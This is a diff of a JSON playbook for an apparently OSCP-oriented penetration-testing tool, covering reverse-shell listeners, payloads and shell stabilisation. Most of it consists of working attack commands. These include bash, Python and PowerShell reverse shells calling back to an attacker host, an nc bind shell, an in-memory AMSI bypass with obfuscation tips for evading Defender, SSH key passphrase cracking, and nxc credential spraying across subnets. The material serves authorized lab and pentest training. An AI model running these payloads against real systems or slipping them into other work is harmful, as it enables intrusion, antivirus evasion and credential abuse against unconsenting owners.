@@ -1,117 +1,457 @@
 {
   "name": "Reverse shells & handlers (§3)",
-  "description": "Once a foothold or command-execution path exists, catch and stabilise an interactive shell: stand up a listener, craft a reverse-shell payload for the target OS, then upgrade to a full PTY. Payloads are only crafted and handed to the operator — never auto-fired, an OSCP requirement; the listener runs locally.",
+  "description": "Once a foothold or command-execution path exists, catch and stabilise an interactive shell: stand up a listener, craft a reverse-shell payload for the target OS, then upgrade to a full PTY. Payloads are only crafted and handed to the operator, never auto-fired, an OSCP requirement; the listener runs locally.",
   "source": "OSCP methodology (project-authored, obol-local)",
   "actions": [
     {
       "id": "shell-listener",
-      "title": "Start a reverse-shell listener",
+      "title": "Start a Reverse-Shell Listener",
       "hypothesis": "Any reverse-shell payload needs a listener already waiting on your LHOST to catch the callback before it fires.",
       "tool": "nc",
-      "tools": ["nc", "ncat", "rlwrap", "penelope"],
-      "requires_any": ["web.cmdi_confirmed", "foothold.linux", "foothold.windows", "exploit.candidate"],
-      "produces": ["listener.open"],
+      "tools": [
+        "nc",
+        "ncat",
+        "rlwrap",
+        "penelope"
+      ],
+      "requires_any": [
+        "web.cmdi_confirmed",
+        "foothold.linux",
+        "foothold.windows",
+        "exploit.candidate"
+      ],
+      "produces": [
+        "listener.open"
+      ],
       "priority": 70,
       "autonomy": "approve",
       "proves": "a listener bound and ready to catch a reverse shell",
-      "does_not_prove": "a caught shell — nothing lands until a callback actually connects",
+      "does_not_prove": "a caught shell, nothing lands until a callback actually connects",
       "commands": [
-        {"tool": "rlwrap", "run": "rlwrap nc -lvnp 4444"},
-        {"tool": "penelope", "run": "penelope 4444"}
+        {
+          "tool": "rlwrap",
+          "run": "rlwrap nc -lvnp 4444"
+        },
+        {
+          "tool": "penelope",
+          "run": "penelope 4444"
+        }
+      ]
+    },
+    {
+      "id": "egress-blocked-shell",
+      "title": "Reverse Shell Never Connects — Egress Is Filtered",
+      "tool": "nc",
+      "tools": [
+        "nc",
+        "ncat",
+        "socat"
+      ],
+      "os": [
+        "linux",
+        "windows"
+      ],
+      "requires_all": [
+        "blocker.egress_blocked"
+      ],
+      "produces": [
+        "advice.egress"
+      ],
+      "priority": 64,
+      "hypothesis": "Your payload ran but nothing hit your listener, or a test connection is refused/timed out: the target cannot reach you OUTBOUND on that port. The box is not unexploitable - pick a port egress allows (443/53 almost always leave), or flip the direction with a BIND shell and connect IN to the target instead.",
+      "proves": "nothing attack-wise; it gets a shell channel through a filtered egress",
+      "does_not_prove": "that all egress is blocked — usually only some ports are; 443/53 commonly pass",
+      "report": {
+        "finding": "Egress filtering on reverse-shell port",
+        "severity": "info"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux"
+      ],
+      "commands": [
+        {
+          "tool": "nc",
+          "run": "sudo nc -lvnp 443   # and point the payload at {{lhost}}:443",
+          "note": "Retry the reverse shell on 443 (then 53): outbound web/DNS almost always leaves even a filtered network. Needs sudo to bind <1024."
+        },
+        {
+          "tool": "nc",
+          "run": "# on the TARGET: nc -lvnp 4444 -e /bin/bash   # then from Kali: nc {{target}} 4444",
+          "note": "BIND shell: if the target cannot dial OUT but you can reach a port IN, have IT listen and you connect. The inverse of a reverse shell."
+        },
+        {
+          "tool": "socat",
+          "run": "ss -tlnp; iptables -L -n   # (from any foothold) confirm what egress/listeners exist",
+          "note": "If you already have any foothold, check its own firewall/egress so you choose a port that actually works instead of guessing."
+        }
       ]
     },
     {
       "id": "shell-revshell-linux",
-      "title": "Linux reverse-shell payload",
+      "title": "Linux Reverse-Shell Payload",
       "hypothesis": "A confirmed command-execution primitive on a Linux target becomes an interactive shell by firing a bash or python callback back to your listener.",
       "tool": "bash",
-      "tools": ["bash", "python3", "nc"],
-      "requires_any": ["listener.open", "web.cmdi_confirmed"],
-      "produces": ["access.shell"],
+      "tools": [
+        "bash",
+        "python3",
+        "nc"
+      ],
+      "requires_any": [
+        "listener.open",
+        "web.cmdi_confirmed"
+      ],
+      "produces": [
+        "access.shell"
+      ],
       "priority": 62,
       "autonomy": "manual",
       "proves": "an interactive shell on the Linux target (once caught)",
-      "does_not_prove": "privileged access — the shell arrives as the exploited service's user, nothing more",
-      "refs": ["https://www.revshells.com/"],
+      "does_not_prove": "privileged access, the shell arrives as the exploited service's user, nothing more",
+      "refs": [
+        "https://www.revshells.com/"
+      ],
       "commands": [
-        {"tool": "bash", "run": "bash -c 'bash -i >& /dev/tcp/{{lhost}}/4444 0>&1'"},
-        {"tool": "python3", "run": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{lhost}}\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"}
+        {
+          "tool": "bash",
+          "run": "bash -c 'bash -i >& /dev/tcp/{{lhost}}/4444 0>&1'"
+        },
+        {
+          "tool": "python3",
+          "run": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{lhost}}\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"
+        }
       ]
     },
     {
       "id": "shell-revshell-windows",
-      "title": "Windows reverse-shell payload",
+      "title": "Windows Reverse-Shell Payload",
       "hypothesis": "A command-execution primitive on Windows becomes a shell via a PowerShell or nc.exe callback back to your listener.",
       "tool": "powershell",
-      "tools": ["powershell", "nc.exe"],
-      "requires_any": ["listener.open", "web.cmdi_confirmed", "foothold.windows"],
-      "produces": ["access.shell"],
+      "tools": [
+        "powershell",
+        "nc.exe"
+      ],
+      "requires_any": [
+        "listener.open",
+        "web.cmdi_confirmed",
+        "foothold.windows"
+      ],
+      "produces": [
+        "access.shell"
+      ],
       "priority": 60,
       "autonomy": "manual",
       "proves": "an interactive shell on the Windows target (once caught)",
-      "does_not_prove": "administrator or SYSTEM — the shell arrives as the exploited process's user",
-      "refs": ["https://www.revshells.com/"],
+      "does_not_prove": "administrator or SYSTEM, the shell arrives as the exploited process's user",
+      "refs": [
+        "https://www.revshells.com/"
+      ],
       "commands": [
-        {"tool": "powershell", "run": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{{lhost}}',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.ASCIIEncoding]::UTF8.GetBytes($r)),0,$r.Length)}\""}
+        {
+          "tool": "powershell",
+          "run": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{{lhost}}',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.ASCIIEncoding]::UTF8.GetBytes($r)),0,$r.Length)}\""
+        }
       ]
     },
     {
       "id": "shell-pty-upgrade",
-      "title": "Upgrade a dumb shell to a full PTY",
+      "title": "Upgrade a Dumb Shell to a Full PTY",
       "hypothesis": "A freshly caught reverse shell is line-buffered and drops Ctrl-C and arrow keys; upgrading it to a PTY gives a real terminal, which su, sudo, and vim all need.",
       "tool": "python3",
-      "tools": ["python3", "script", "stty"],
-      "requires_any": ["access.shell"],
+      "tools": [
+        "python3",
+        "script",
+        "stty"
+      ],
+      "requires_any": [
+        "access.shell"
+      ],
       "produces": [],
       "priority": 58,
       "autonomy": "manual",
       "proves": "a fully-interactive TTY on the target",
-      "does_not_prove": "any new access — it only stabilises the shell you already hold",
-      "refs": ["https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/"],
+      "does_not_prove": "any new access, it only stabilises the shell you already hold",
+      "refs": [
+        "https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/"
+      ],
       "commands": [
-        {"tool": "python3", "run": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  # then Ctrl-Z; stty raw -echo; fg; export TERM=xterm"}
+        {
+          "tool": "python3",
+          "run": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  # then Ctrl-Z; stty raw -echo; fg; export TERM=xterm"
+        }
+      ]
+    },
+    {
+      "id": "fix-no-tty",
+      "title": "No TTY — Upgrade to a Real Shell",
+      "tool": "python3",
+      "tools": [
+        "python3",
+        "script",
+        "stty"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [
+        "blocker.no_tty"
+      ],
+      "produces": [
+        "advice.tty"
+      ],
+      "priority": 66,
+      "sequence": true,
+      "hypothesis": "'sudo: no tty present' / 'must be run from a terminal' means your shell is a dumb pipe (a web/reverse shell) with no controlling terminal - sudo, su, ssh and many interactive tools refuse to run. Spawn a PTY and they work. This is the first thing to do on nearly every raw reverse shell.",
+      "proves": "nothing attack-wise; it turns a dumb shell into an interactive PTY so terminal-only commands run",
+      "does_not_prove": "a better privilege — same user, now with a usable terminal",
+      "report": {
+        "finding": "Dumb shell upgraded to a PTY",
+        "severity": "info"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys"
+      ],
+      "commands": [
+        {
+          "tool": "python3",
+          "run": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+          "note": "Spawn a PTY (python2: same with python). If python is absent: `script -qc /bin/bash /dev/null`."
+        },
+        {
+          "tool": "stty",
+          "run": "# Ctrl-Z, then on Kali: stty raw -echo; fg ; then in the shell: export TERM=xterm; stty rows 50 cols 200",
+          "note": "Full upgrade: background the shell, set your terminal raw, foreground it, and fix TERM/size so arrow keys, tab-complete, and clear work. Now sudo/su run."
+        }
+      ]
+    },
+    {
+      "id": "fix-tool-wont-run",
+      "title": "Your Uploaded Tool Won't Run — Fix It",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "dos2unix"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [
+        "blocker.crlf"
+      ],
+      "produces": [
+        "advice.exec"
+      ],
+      "priority": 60,
+      "hypothesis": "\"bad interpreter: No such file or directory\" on a script you uploaded means Windows CRLF line endings - the kernel looks for an interpreter literally named `/bin/bash\\r`. Strip the carriage returns and it runs. The same family of wall: a binary in a noexec /tmp, or one you forgot to chmod +x.",
+      "proves": "nothing attack-wise; it gets your own tooling running on the foothold",
+      "does_not_prove": "anything about the target beyond its mount options",
+      "report": {
+        "finding": "Uploaded tool blocked by line endings / exec perms",
+        "severity": "info"
+      },
+      "commands": [
+        {
+          "tool": "dos2unix",
+          "run": "dos2unix {{script}}  # or: sed -i 's/\\r$//' {{script}}",
+          "note": "CRLF fix: strips the carriage returns so the shebang resolves. The #1 cause of \"bad interpreter\"."
+        },
+        {
+          "tool": "sh",
+          "run": "chmod +x {{binary}}; mv {{binary}} /dev/shm/ && /dev/shm/{{binary}}",
+          "note": "NOEXEC /tmp: if a binary gives \"Permission denied\" even after chmod +x, /tmp is mounted noexec — run it from /dev/shm or your home. Last resort: invoke the loader directly: /lib64/ld-linux-x86-64.so.2 ./{{binary}}."
+        }
+      ]
+    },
+    {
+      "id": "bypass-amsi",
+      "title": "Defender / AMSI Ate the Payload",
+      "tool": "powershell",
+      "tools": [
+        "powershell"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [
+        "blocker.amsi"
+      ],
+      "produces": [
+        "advice.amsi"
+      ],
+      "priority": 60,
+      "hypothesis": "\"This script contains malicious content\" or \"contains a virus\" is AMSI/Defender flagging a known payload, not a broken technique. Patch AMSI in your current session, obfuscate the script, or switch to a living-off-the-land path that is not signatured. The payload is fine; its signature is the problem.",
+      "proves": "nothing attack-wise; it gets a blocked payload past the on-host scanner",
+      "does_not_prove": "that EDR is fully blind; behavioural detection may still fire",
+      "report": {
+        "finding": "AMSI / Defender blocked a payload",
+        "severity": "info"
+      },
+      "refs": [
+        "https://amsi.fail/"
+      ],
+      "commands": [
+        {
+          "tool": "powershell",
+          "run": "[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)",
+          "note": "The classic in-memory AMSI patch for the CURRENT PowerShell session (string-split to dodge the signature on the patch itself). Run it, then your blocked script loads."
+        },
+        {
+          "tool": "powershell",
+          "run": "Invoke-Obfuscation / change the payload",
+          "note": "If the patch is itself caught: obfuscate (variable renames, base64+IEX), use a fresh/rewritten tool, or drop to a LOLBAS technique (certutil, regsvr32) that is not signatured."
+        }
       ]
     },
     {
       "id": "ssh-key-login",
-      "title": "Log in over SSH with a recovered private key",
-      "hypothesis": "A PEM private key recovered from loot (LFI, a backup, a readable home, a git-dump) is a foothold when SSH is reachable — save it, tighten its permissions, and log in. The username is the piece to determine (the key's path/comment, an enumerated user, or the box's theme).",
+      "title": "Log in over SSH with a Recovered Private Key",
+      "hypothesis": "A PEM private key recovered from loot (LFI, a backup, a readable home, a git-dump) is a foothold when SSH is reachable, save it, tighten its permissions, and log in. The username is the piece to determine (the key's path/comment, an enumerated user, or the box's theme).",
       "tool": "ssh",
-      "tools": ["ssh"],
-      "requires_all": ["ssh.reachable"],
-      "requires_any": ["credential.certificate"],
-      "produces": [],
+      "tools": [
+        "ssh"
+      ],
+      "requires_all": [
+        "ssh.reachable"
+      ],
+      "requires_any": [
+        "credential.certificate"
+      ],
+      "produces": [
+        "foothold.linux",
+        "access.shell"
+      ],
       "priority": 66,
       "autonomy": "approve",
       "proves": "an interactive SSH session as the key's owner (an id/whoami confirms the identity)",
       "does_not_prove": "which user the key belongs to until a login succeeds, nor any privilege beyond that user",
-      "refs": ["https://gtfobins.github.io/", "https://man.openbsd.org/ssh"],
+      "refs": [
+        "https://gtfobins.github.io/",
+        "https://man.openbsd.org/ssh"
+      ],
       "commands": [
-        {"tool": "ssh", "run": "chmod 600 id_rsa && ssh -i id_rsa -o StrictHostKeyChecking=no <user>@{{target}}",
-         "note": "save the recovered key to id_rsa first; try likely usernames (key comment, enumerated users, root). An encrypted key (ENCRYPTED header) → ssh2john id_rsa > k.hash && hashcat/john it, then unlock."}
+        {
+          "tool": "ssh",
+          "run": "chmod 600 id_rsa && ssh -i id_rsa -o StrictHostKeyChecking=no {{user}}@{{target}}",
+          "note": "save the recovered key to id_rsa first; try likely usernames (key comment, enumerated users, root). An encrypted key (ENCRYPTED header) → ssh2john id_rsa > k.hash && hashcat/john it, then unlock."
+        }
+      ]
+    },
+    {
+      "id": "ssh-key-troubleshoot",
+      "title": "SSH Key Rejected — Fix It",
+      "hypothesis": "A found or planted SSH key that SSH refuses is a puzzle lab authors use to stall you, not a dead end - the key is fine, something around it is wrong. Match the exact error to its fix: local key permissions, a passphrase, the modern ssh-rsa block, a mangled format, or - the sneaky one - the TARGET's own ~/.ssh permissions, which you can only correct from a foothold you already hold. Work the list and the key logs you in.",
+      "tool": "ssh",
+      "tools": [
+        "ssh",
+        "ssh2john",
+        "john"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [
+        "ssh.key_rejected"
+      ],
+      "produces": [
+        "advice.ssh"
+      ],
+      "priority": 80,
+      "sequence": true,
+      "proves": "a working SSH key login once the surrounding blocker is fixed — a foothold",
+      "does_not_prove": "that the key is valid at all; if every fix fails, the key may be for a different user or host",
+      "report": {
+        "finding": "SSH key blocker resolved",
+        "severity": "info"
+      },
+      "refs": [
+        "https://man.openbsd.org/ssh_config",
+        "https://www.openssh.com/legacy.html"
+      ],
+      "commands": [
+        {
+          "tool": "ssh",
+          "run": "chmod 600 {{keyfile}}",
+          "note": "\"UNPROTECTED PRIVATE KEY FILE\" / \"permissions are too open\": SSH ignores a world-readable key. This is CLIENT-side (your Kali). Fix and retry."
+        },
+        {
+          "tool": "ssh",
+          "run": "ssh -i {{keyfile}} -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa {{user}}@{{target}}",
+          "note": "\"Permission denied (publickey)\" with \"no mutual signature algorithm\": OpenSSH 8.8+ disabled ssh-rsa by default, so a valid RSA key is refused. Re-enable it with these two options — the single most common silent failure on older lab keys."
+        },
+        {
+          "tool": "ssh2john",
+          "run": "ssh2john {{keyfile}} > key.hash && john --wordlist={{wordlist}} key.hash",
+          "note": "\"Enter passphrase for key\": the key is encrypted. Crack the passphrase offline, then use it. (A leaked passphrase, e.g. via Heartbleed, skips the crack.)"
+        },
+        {
+          "tool": "ssh",
+          "run": "dos2unix {{keyfile}}; ssh-keygen -y -f {{keyfile}}",
+          "note": "\"Load key: invalid format\": usually CRLF line endings from a Windows copy/paste, a missing -----BEGIN/END----- line, or a PuTTY .ppk (convert with `puttygen {{keyfile}} -O private-openssh -o id_rsa`). ssh-keygen -y validates the fixed key."
+        },
+        {
+          "tool": "ssh",
+          "run": "chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys && chown {{user}}:{{user}} ~/.ssh ~/.ssh/authorized_keys",
+          "note": "THE PUZZLE: \"Permission denied (publickey)\" when the key SHOULD work. SSH StrictModes refuses a key whose ~/.ssh / authorized_keys on the TARGET is group/world-writable or wrongly owned. Run THIS on the target through the foothold you already have (web shell, another account), then retry the key login for a stable session."
+        },
+        {
+          "tool": "ssh",
+          "run": "ssh -i {{keyfile}} {{user}}@{{target}} id",
+          "note": "Retry after the matching fix. `uid=...` means the key now works — you have your foothold."
+        }
       ]
     },
     {
       "id": "linux-remote-exec",
       "title": "Authenticated Remote Command (SSH)",
-      "hypothesis": "With a Linux credential (a password or a private key) and SSH reachable, you can run any command on the box without holding an interactive session — enumerate, hunt privesc, grab flags. The web crafter's Linux 'run on host' menu fills {{command}} (id, sudo -l, SUID find…) and you edit it freely.",
-      "tool": "sshpass",
-      "tools": ["sshpass", "ssh"],
-      "os": ["linux"],
-      "requires_all": ["ssh.reachable"],
-      "requires_any": ["credential.available", "credential.certificate", "foothold.linux"],
-      "produces": ["foothold.linux", "access.shell"],
+      "hypothesis": "With a Linux credential (a password or a private key) and SSH reachable, you can run any command on the box without holding an interactive session, enumerate, hunt privesc, grab flags. The web crafter's Linux 'run on host' menu fills {{command}} (id, sudo -l, SUID find…) and you edit it freely.",
+      "tool": "nxc",
+      "tools": [
+        "nxc",
+        "sshpass",
+        "ssh"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [
+        "ssh.reachable"
+      ],
+      "requires_any": [
+        "credential.available",
+        "credential.certificate",
+        "foothold.linux"
+      ],
+      "produces": [
+        "foothold.linux",
+        "access.shell"
+      ],
       "priority": 72,
       "autonomy": "manual",
       "proves": "command execution on the Linux host as the authenticating user (an id confirms it)",
       "does_not_prove": "any privilege beyond that user until a privesc is demonstrated on its own",
-      "report": {"finding": "Authenticated Access via Exposed Credentials", "severity": "high"},
-      "refs": ["https://gtfobins.github.io/", "https://man.openbsd.org/ssh"],
+      "report": {
+        "finding": "Authenticated Access via Exposed Credentials",
+        "severity": "high"
+      },
+      "refs": [
+        "https://gtfobins.github.io/",
+        "https://man.openbsd.org/ssh"
+      ],
       "commands": [
-        {"tool": "sshpass", "run": "sshpass -p '{{password}}' ssh -o StrictHostKeyChecking=no {{user}}@{{target}} '{{command}}'",
-         "note": "Password auth — runs one command and returns. String several with ';' inside the quotes."},
-        {"tool": "ssh", "run": "ssh -i id_rsa -o StrictHostKeyChecking=no {{user}}@{{target}} '{{command}}'",
-         "note": "Key auth — save the recovered private key to id_rsa first."}
+        {
+          "tool": "nxc",
+          "run": "nxc ssh {{target}} -u {{user}} -p '{{password}}' -x '{{command}}'",
+          "note": "PREFERRED, from Kali: validate the credential over SSH and run {{command}} in one shot, and point {{target}} at a subnet/targets file to spray-and-exec the same cred across every Linux host at once. Swap -p for --key-file id_rsa to use a recovered private key. For a full interactive shell, use the raw ssh below."
+        },
+        {
+          "tool": "sshpass",
+          "run": "sshpass -p '{{password}}' ssh -o StrictHostKeyChecking=no {{user}}@{{target}} '{{command}}'",
+          "note": "Password auth, runs one command and returns. String several with ';' inside the quotes."
+        },
+        {
+          "tool": "ssh",
+          "run": "ssh -i id_rsa -o StrictHostKeyChecking=no {{user}}@{{target}} '{{command}}'",
+          "note": "Key auth, save the recovered private key to id_rsa first."
+        }
       ]
     }
   ]
